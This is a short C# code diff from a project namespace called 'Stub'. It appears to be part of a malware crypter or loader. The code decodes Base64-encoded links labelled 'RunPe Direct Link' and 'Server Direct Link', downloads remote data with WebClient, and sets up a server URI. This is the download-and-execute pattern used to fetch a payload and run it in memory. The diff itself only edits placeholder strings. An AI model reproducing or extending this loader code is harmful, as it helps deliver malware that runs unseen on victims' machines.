@@ -18,13 +18,13 @@ namespace Stub
 
             WebClient webClient = new WebClient();
 
-            string metadataBuilder = Encoding.UTF8.GetString(Convert.FromBase64String("RunPe Direct Link"));
+            string metadataBuilder = Encoding.UTF8.GetString(Convert.FromBase64String("RunPe Direct Link Base64"));
 
             byte[] codeBuilder = webClient.DownloadData(metadataBuilder);
 
             WebClient webClient2 = new WebClient();
 
-            string signatureBuilder = Encoding.UTF8.GetString(Convert.FromBase64String("Server Direct Link"));
+            string signatureBuilder = Encoding.UTF8.GetString(Convert.FromBase64String("Server Direct Link Base64"));
 
             Uri MethodSignature = new Uri(signatureBuilder);
 
